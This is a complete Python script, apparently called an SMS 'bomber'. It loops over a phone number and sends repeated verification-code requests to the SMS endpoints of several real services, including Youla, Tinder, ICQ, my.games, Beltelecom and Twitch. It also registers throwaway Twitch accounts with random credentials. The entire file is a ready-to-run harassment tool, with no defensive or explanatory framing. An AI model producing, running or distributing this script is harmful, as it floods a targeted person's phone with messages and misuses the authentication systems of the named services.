#!/usr/bin/env python3
# coding: utf-8

import requests,random,urllib.request,argparse


class Bomber:

    def __init__(self, name ,numm ,count ):
        self.name=name
        self.num=numm
        self.count=count

    def bomb(self):
        #data init
        _phone=self.num
        _name=self.name
        num = _phone
        _phone9 = _phone[1:]
        numplus = '+' + num
        for x in range(12):
            _name = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
            password = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
            username = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
        #bomber
        i = 0
        while True:
            print("|-|"*(i+1))
            if i==int(self.count):
                print("Finished..")
                break

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus})
            except:
                print("#1 Failed.")
            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":numplus})
            except:
                print("#2 Failed.")
            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num))
            except:
                print("#3 Failed.")
            try:
                requests.post('https://account.my.games/signup_send_sms/', data={'phone': _phone})
            except:
                print("#4 Failed.")
            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            except:
                print("#5 Failed.")
            try:
                requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            except:
                print("#6 Failed.")
            try:
                requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            except:
                print("#7 Failed.")
            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            except:
                print("#8 Failed.")
            finally:
                
                i+=1

    def start(self):
        Bomber.bomb(self)

parser=argparse.ArgumentParser()
parser.add_argument("-num","--num",dest="number",default="000000000000")
parser.add_argument("-name","--name",dest="name",default="abcd")
parser.add_argument("-count","--count",dest="count",default="5")
args = parser.parse_args()

name=args.name
number=args.number
count=args.count
b=Bomber(name,number,count)
b.start()
